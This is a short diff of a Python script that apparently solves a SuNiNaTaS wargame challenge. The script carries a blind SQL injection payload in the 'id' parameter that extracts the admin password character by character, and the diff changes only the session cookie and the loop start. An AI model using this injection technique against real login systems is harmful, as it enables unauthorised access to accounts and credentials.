@@ -4,12 +4,12 @@ import urllib, urllib2
 import time
 r=''
 headers = {'Host': 'suninatas.com',
-           'Cookie': 'ASPSESSIONIDSSSDDTCC=EHJGAGDDJCOBFCNMEIJLMODF;'
+           'Cookie': 'ASPSESSIONIDQABRATBA=EGNLPBAAFIIAABCPOENNDACE;'
         }
  
 string = " abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~!@#$^&*()-_+="
  
-for i in range(0,12):
+for i in range(1,12):
     for j in range(32,128):
         data = "?id="
         data = data + "admin' and(substring(pw,{},1)='{}')--".format(i, chr(j))
